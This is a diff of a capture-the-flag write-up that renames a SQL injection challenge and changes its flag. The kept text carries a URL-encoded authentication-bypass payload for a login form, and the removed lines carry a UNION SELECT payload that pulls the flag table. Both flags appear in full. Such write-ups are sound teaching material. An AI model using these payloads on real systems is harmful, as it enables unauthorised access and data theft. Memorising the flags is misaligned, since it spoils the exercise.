@@ -1,14 +1,20 @@
-# My First PHP Site
+# Challenge
 
-**Description:** My first PHP website looks extremely cool! However, some random Security researchers keep on contacting me about *"several injection vulnerabilities"*. In all honesty I have no idea what they are talking about, so can you test my website and find the vulnerabilities for me?
+**Name:** Super Quiet Library Injection
 
-The flag is in the table called **flag** on the database.
+**Category:** Vulnerabilities
 
-**Flag:** CTF{i_5h0uLd_pRoBs_l3aRn_aBoUt_pRePaRed_qU3ri3s...}
+**Difficulty:** Hard
+
+**Description:** 
+
+You need to be very quiet in the **Super Quiet Library** and not **Inject** any noise into the environment!
+
+**Flag:** CITS1003{iNj3tInG_tH3_5Ql_l00000l!!!!11one!!}
 
 ## Solution
 
-### Step 1: Authentication Bypass
+### SQLi Authentication Bypass
 
 * The login page is vulnerable to SQLi authentication bypass
 
@@ -16,9 +22,3 @@ The flag is in the table called **flag** on the database.
 ```
 username=admin%27+or+%271%27+%3D+%271%27%3B--&password=test
 ```
-
-### Step 2: Union Select SQLi
-
-* The feedback viewer is vulnerable to a UNION SELECT attack.
-
-* Example attack: `' UNION SELECT 1, 2, flag FROM flag;--`
